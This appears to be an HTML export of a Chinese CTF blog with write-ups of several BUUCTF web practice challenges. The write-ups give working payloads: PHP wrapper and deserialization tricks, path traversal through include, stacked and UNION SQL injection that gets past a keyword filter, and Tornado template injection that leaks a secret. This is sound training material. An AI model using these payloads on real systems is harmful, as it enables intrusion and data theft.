<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><a href="http://e1d2e78d-5eb7-4c10-88ca-b46fcfd7fba3.node3.buuoj.cn" target="_blank" rel="noopener">http://e1d2e78d-5eb7-4c10-88ca-b46fcfd7fba3.node3.buuoj.cn</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>$text里的file_get_contents()函数会把整个文件读入一个字符串中,即需要传入一个文件内容为”welcome to the zjctf”,采用php伪协议传输<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./25.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>$file里可以include文件,但对flag做了过滤,同时注释了useless.php,利用php伪协议查看源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./26.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>useless.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据index.php里password会序列化,在useless.php里进行反序列化<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>一并传入,查看源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./27.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{20a27159-4eb0-48e4-af80-c437443282a8}</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BUUCTF web练习2]]></title>
      <url>/ctf-writeup-web/ckwd5ws76001hd0ucasyi62rs/</url>
      <content type="html"><![CDATA[<p>web题自然是想md形式,看着好看,奈何本地报错,pdf凑合看吧</p>
<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="BUUCTF_web练习2.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[[MISC]拼图题小结]]></title>
      <url>/ctf-writeup-misc/ckwd5ws82002td0uccl5txccw/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="[MISC]拼图题小结.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 知识小结 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web for pentester 1 wp]]></title>
      <url>/ctf-writeup-web/ckwd5ws9g0050d0ucpyv9xy44/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="web_for_pentester_1_wp.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BUUCTF_web练习1]]></title>
      <url>/ctf-writeup-web/ckwd5ws78001kd0ucxoiv4c0m/</url>
      <content type="html"><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><a href="http://b76e95a3-a2ea-4205-a05c-bde04cd66b95.node3.buuoj.cn" target="_blank" rel="noopener">http://b76e95a3-a2ea-4205-a05c-bde04cd66b95.node3.buuoj.cn</a></p>
<p>查看源码看到提示source.php,访问之,得到源码,审计之</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//$whitelist变量只包含source.php和hint.php,isset函数检测变量是否声明,is_string函数检测变量是否为字符串,in_array函数检测数组中是否匹配$whitelist</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//mb_substr返回$page字符串从头开始,到mb_strpos查找?在$page中首次出现的位置的一段长度的字符,即如果$page有?,则截取?前的字符串</span></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//对$page进行解码,并再截取一遍</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"><span class="comment">//empty检查变量file是否为空,并is_string判断是否为字符串,并且要能访问,条件都满足就包含file传入的文件进行访问</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问hint.php试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?file=hint.php</span><br><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br><span class="line">/?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure></p>
<p>flag{3e11f910-1c51-453c-af9a-029edd269163}</p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><a href="http://d3003809-2d5c-4066-a9c6-9a706cb6e6d1.node3.buuoj.cn" target="_blank" rel="noopener">http://d3003809-2d5c-4066-a9c6-9a706cb6e6d1.node3.buuoj.cn</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos; //报错,存在sql注入</span><br><span class="line">尝试select提示被过滤</span><br><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+databases;  //尝试堆叠注入查看数据库</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+tables+from+supersqli;  //查表</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;show+columns+from+`1919810931114514`;  //查列</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>因为show最多只能查询到字段名,无法查询具体数据,所以还是需要绕过过滤,这里用的是预编译法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=-1&apos;;use supersqli;set @sql=concat(&apos;s&apos;,&apos;elect `flag` from `1919810931114514`&apos;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{940f9932-6f3f-4507-a641-e91163cb4e03}</p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><a href="http://38f97425-069f-4ac7-a2de-960197db8f8b.node3.buuoj.cn" target="_blank" rel="noopener">http://38f97425-069f-4ac7-a2de-960197db8f8b.node3.buuoj.cn</a></p>
<p>尝试输入1,发现是post传参的注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query=1</span><br><span class="line">query=1;show databases;</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;show tables;</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>而后发现from被过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=*,1  ==&gt;  select *,1 || flag from flag</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">官方解法</span><br><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br><span class="line">构造成</span><br><span class="line">select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM Flag</span><br><span class="line">其中PIPES_AS_CONCAT能将||视为字符串连接符而非或运算符</span><br><span class="line">实际运行为</span><br><span class="line">select 1;set sql_mode=PIPES_AS_CONCAT;select &quot;1&quot;+flag from Flag</span><br></pre></td></tr></table></figure>
<p>flag{22da20ee-17da-4f57-8a47-643580b0d03b}</p>
<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><a href="http://5f70d406-086d-4640-a0c5-d08988a8f729.node3.buuoj.cn" target="_blank" rel="noopener">http://5f70d406-086d-4640-a0c5-d08988a8f729.node3.buuoj.cn</a></p>
<figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>直接手注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1&apos;and+&apos;1&apos;=&apos;2&apos;+union+select+1,2,&apos;3</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{9da954e2-3523-4bdb-8beb-77c5c4b905ac}</p>
<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><a href="http://dc831063-5096-4421-8cad-7d59def721a5.node3.buuoj.cn" target="_blank" rel="noopener">http://dc831063-5096-4421-8cad-7d59def721a5.node3.buuoj.cn</a></p>
<p>查看源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	$cat=$_GET[&apos;cat&apos;];</span><br><span class="line">	echo $cat;</span><br><span class="line">	if($cat==&apos;dog&apos;)&#123;</span><br><span class="line">	echo &apos;Syc&#123;cat_cat_cat_cat&#125;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	--&gt;</span><br></pre></td></tr></table></figure>
<p>根据提示传入参数使得cat=dog<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cat=dog</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{7d14e194-7772-4d41-8c61-fb1a0388b25e}</p>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p><a href="http://6538e59c-7290-4314-876a-71896b2316fa.node3.buuoj.cn" target="_blank" rel="noopener">http://6538e59c-7290-4314-876a-71896b2316fa.node3.buuoj.cn</a></p>
<figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>挨个访问得到信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/flag.txt&amp;filehash=4d81edafee08fa38738a59e9fd150d50</span><br><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line">/file?filename=/welcome.txt&amp;filehash=27f929d16f4606d46be11db34391a228</span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line">/file?filename=/hints.txt&amp;filehash=bfc06735e011c9552a2fdb9f07e6dccc</span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
<p>根据规律需要构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(fllllllllllllag))</span><br></pre></td></tr></table></figure></p>
<p>先看看render,是个调用 res.render({options}) 去向模板中渲染数据, 可以把视图响应给客户端的渲染函数,尝试抓包访问fllllllllllllag文件<br><figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>根据/error?msg=Error提示可以用error变量读取文件,查一下tornado里cookie_secret的位置</p>
<p><a href="https://www.tornadoweb.org/en/latest/guide/security.html" target="_blank" rel="noopener">https://www.tornadoweb.org/en/latest/guide/security.html</a>在handler/settings文件里</p>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>cookie_secret:0a2781d2-6438-4103-8978-926c5e109fc8</p>
<p>接下来根据提示写个脚本加密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">cookie_secret = <span class="string">'0a2781d2-6438-4103-8978-926c5e109fc8'</span></span><br><span class="line">md5.update(filename.encode(<span class="string">"utf8"</span>))</span><br><span class="line">file_md5 = md5.hexdigest()</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(cookie_secret + file_md5)</span><br><span class="line">filehash = md5.hexdigest()</span><br><span class="line"><span class="keyword">print</span> filehash</span><br></pre></td></tr></table></figure>
<p>得到 022b103d797804318dc8eb68133d1dcc<br><figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>flag{c14f33f9-d55a-4416-8215-e0468fe7f9c0}</p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p><a href="http://3c1b7c0b-3605-4ce5-b792-0b9ca36ddd7f.node3.buuoj.cn" target="_blank" rel="noopener">http://3c1b7c0b-3605-4ce5-b792-0b9ca36ddd7f.node3.buuoj.cn</a></p>
<p>查看源码,找到可疑页面</p>
<figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>继续看源码</p>
<figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>然后直接end了,提示回去看看</p>
<figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>Archive_room.php –&gt; end.php</p>
<p>抓个包看看,发现跳板是action.php</p>
<figure class="image-box">
                <img src="./20.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>访问secr3t.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="comment">//strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE,这个函数区分大小写,stristr()函数不区分大小写</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>根据代码需要用到base64读取文件源码的伪协议,构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p>
<p>解base64得源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">"background-color:black;"</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=<span class="string">"font-family:verdana;color:red;text-align:center;"</span>&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=<span class="string">"font-family:arial;color:red;font-size:20px;text-align:center;"</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"我就在这里"</span>;</span><br><span class="line">                $flag = <span 